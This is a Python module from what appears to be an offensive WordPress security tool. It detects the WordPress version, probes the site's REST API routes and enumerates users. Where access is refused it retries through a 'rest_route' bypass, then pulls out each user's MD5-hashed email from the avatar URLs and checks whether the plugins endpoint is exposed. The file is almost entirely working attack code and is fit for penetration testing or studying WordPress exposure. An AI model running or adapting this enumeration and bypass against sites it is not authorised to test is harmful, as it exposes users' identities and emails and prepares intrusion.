from modules.exploitation.csrf import generator
import requests
import colorama


def userResponseHandler(jsonResponse):
    for i in jsonResponse:
        try:
            userID = i["id"]
            name = i["name"]
            username = i["slug"]
            # Profile picture URL structure - http://2.gravatar.com/avatar/292385fadecede629819576d789bcaab?s=24&d=mm&r=g
                # MD5 hash of the user's email is last part of the image
                # Another way to access this data about the users is via: https://public-api.wordpress.com/rest/v1.1/sites/{site}/posts where {site} is a blog
                # read more on this here: https://www.gosecure.net/blog/2021/03/02/emails-disclosure-on-wordpress/
            emailMD5Hash = i["avatar_urls"]["24"]
            # remove the rest of the URL, we only want the hash
            emailMD5Hash = emailMD5Hash.split("/")[-1]
            emailMD5Hash = emailMD5Hash.split("?")[0]
            print(colorama.Fore.LIGHTGREEN_EX + "[+] User ID: {0} Name: {1} Username: {2} MD5 Hashed Email: {3}".format(userID, name, username, emailMD5Hash))
        except:
            print(colorama.Fore.LIGHTRED_EX + "[!] Problem fetching users! Please check /wp-json/wp/v2/users")

def userBypass1(url, headers):
    if url.endswith("/"):
        url = url + "blog?rest_route=/wp/v2/users"
    else:
        url = url + "/blog?rest_route=/wp/v2/users"
    response = requests.get(url, headers=headers)
    if response.status_code == 401:
        return "unauthorized"
    else:
        return response.json()

def routeCheck(url, routeJson, headers):
    for path in routeJson:
        if url.endswith("/"):
            pathUrl = url + path[1:]
        else:
            pathUrl = url + path
        response = requests.get(pathUrl, headers=headers)
        if response.status_code == 200:
            print(colorama.Fore.LIGHTGREEN_EX + "[+] {0} is accessible!".format("/wp-json" + path))
        else:
            print(colorama.Fore.LIGHTRED_EX + "[-] {0} is inaccessible".format("/wp-json" + path))

# search for available REST API calls
# try to find available users
def scan(url):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
    
    # finding WP version
    response = requests.get(url, headers=headers)
    generatorTagStart = response.text.find('content="WordPress')
    # if we find the generator tag, we print the WP version
    if generatorTagStart != -1:
        wpVersion = response.text[generatorTagStart+len('content="WordPress'):generatorTagStart+len('content=Wordpress')+7]
        print(colorama.Fore.LIGHTGREEN_EX + "WordPress Version: {0}".format(wpVersion))
    
    if url.endswith("/"):
        url = url + "wp-json"
    else:
        url = url + "/wp-json"

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(colorama.Fore.LIGHTGREEN_EX + "[+] /wp-json accessible!")
        # TODO: go through each available route & see if they're accessible (returning 200)
        availableRoutes = response.json()["routes"]
        routeCheck(url, availableRoutes, headers)
        #for path in availableRoutes:
        #    print(colorama.Fore.LIGHTGREEN_EX + "[+] {0} is available!".format(path))

        userUrl = url + "/wp/v2/users"
        response = requests.get(userUrl, headers=headers)
        if response.status_code == 401:
            # can also try to bypass this protection (/blog?rest_route=/wp/v2/users/)
            print(colorama.Fore.LIGHTRED_EX + "[-] /wp-json/wp/v2/users inaccessible! Cannot list users")
            bypass1Response = userBypass1(url, headers)
            if bypass1Response == "unauthorized":
                print(colorama.Fore.LIGHTRED_EX + "[-] Attempt 1 to bypass /wp-json/wp/v2/users restriction failed!")
            else:
                print(colorama.Fore.LIGHTGREEN_EX + "[+] Attempt 1 to bypass /wp-json/wp/v2/users restriction succeeded!")
                userResponseHandler(bypass1Response)   
        else:
            print(colorama.Fore.LIGHTGREEN_EX + "[+] /wp-json/wp/v2/users accessible! Grabbing users...")
            userResponseHandler(response.json())
        pluginUrl = url + "/wp/v2/plugins"
        response = requests.get(pluginUrl, headers=headers)
        if response.status_code == 401 or response.status_code == 404:
            print(colorama.Fore.LIGHTRED_EX + "[-] /wp-json/wp/v2/plugins inaccessible! Cannot list installed plugins!")
        else:
            print(colorama.Fore.LIGHTGREEN_EX + "[+] /wp-json/wp/v2/plugins accessible!")

    else:
        print(colorama.Fore.LIGHTRED_EX + "[-] /wp-json inaccessible!")
        return

